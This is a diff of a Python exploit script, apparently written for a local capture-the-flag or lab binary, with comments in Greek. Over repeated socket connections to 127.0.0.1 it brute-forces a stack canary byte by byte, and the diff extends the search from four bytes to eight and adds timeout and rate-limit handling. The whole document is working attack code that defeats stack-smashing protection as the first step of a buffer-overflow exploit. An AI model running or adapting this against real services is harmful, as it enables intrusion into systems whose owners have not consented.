@@ -1,43 +1,48 @@
 import socket
+import time
 
 def solve():
-    host = '127.0.0.1'
-    port = 28285
-    padding = b"A" * 116
+    host, port = '127.0.0.1', 28285
+    padding = b"A" * 122
     known_canary = b""
 
-    print("--- Starting Brute-force with Sockets ---")
+    print("--- Starting Robust Brute-force (8 bytes) ---")
 
-    for i in range(4):
-        print(f"Searching for byte {i}...")
+    for i in range(8):
+        print(f"Searching for byte {i}...", end=" ", flush=True)
+        found = False
         for candidate in range(256):
             try:
-                # Δημιουργία σύνδεσης
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.2)
+                s.settimeout(0.5) # Αυξημένο timeout
                 s.connect((host, port))
                 
-                # Payload construction
                 payload = padding + known_canary + bytes([candidate])
                 s.sendall(payload)
                 
-                # Λήψη απάντησης
                 try:
                     data = s.recv(1024)
                 except socket.timeout:
-                    data = b""
+                    data = b"timeout" # Θεωρούμε το timeout ως αποτυχία
                 
                 s.close()
 
-                # Αν ΔΕΝ περιέχει το μήνυμα σφάλματος, το byte είναι σωστό
-                if b"Stack smashing detected" not in data:
+                # ΠΡΟΣΟΧΗ: Πρέπει η απάντηση να ΜΗΝ έχει το smashing 
+                # ΑΛΛΑ να έχει την κανονική έξοδο του προγράμματος (π.χ. το "Twit:")
+                if data != b"timeout" and b"Stack smashing detected" not in data:
                     known_canary += bytes([candidate])
-                    print(f"Found byte {i}: {hex(candidate)}")
+                    print(f"Found: {hex(candidate)}")
+                    found = True
                     break
-            except Exception as e:
+            except:
+                time.sleep(0.01) # Μικρή ανάσα για το socket
                 continue
+        
+        if not found:
+            print("\n[!] Failed to find byte. Server might be rate-limiting.")
+            break
 
-    print(f"FINAL_CANARY: {known_canary.hex()}")
+    print(f"\nFINAL_CANARY: {known_canary.hex()}")
 
 if __name__ == "__main__":
     solve()
